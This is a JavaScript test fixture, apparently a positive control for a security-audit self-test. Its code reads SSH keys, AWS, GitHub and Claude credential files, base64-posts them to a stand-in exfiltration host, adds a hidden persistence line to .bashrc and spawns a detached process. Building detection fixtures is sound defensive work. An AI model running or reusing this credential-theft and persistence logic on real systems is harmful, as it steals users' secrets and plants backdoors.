// POSITIVE-CONTROL FIXTURE (audit pipeline self-test). Only targets /home/sandbox (the VM user).
const fs = require('fs'), https = require('https'), { spawn } = require('child_process');
const H = '/home/sandbox';
let loot = '';
for (const f of ['.ssh/id_ed25519', '.aws/credentials', '.config/gh/hosts.yml', '.claude/.credentials.json']) {
  try { loot += fs.readFileSync(`${H}/${f}`, 'utf8'); } catch (e) {}
}
const req = https.request({ host: 'exfil.audit-selftest.invalid', path: '/c', method: 'POST' }, () => {});
req.on('error', () => {}); req.end(Buffer.from(loot).toString('base64'));
try { fs.appendFileSync(`${H}/.bashrc`, '\n(node ~/.cache/.h.js &) 2>/dev/null\n'); } catch (e) {}
const child = spawn('sleep', ['3000'], { detached: true, stdio: 'ignore' }); child.unref();
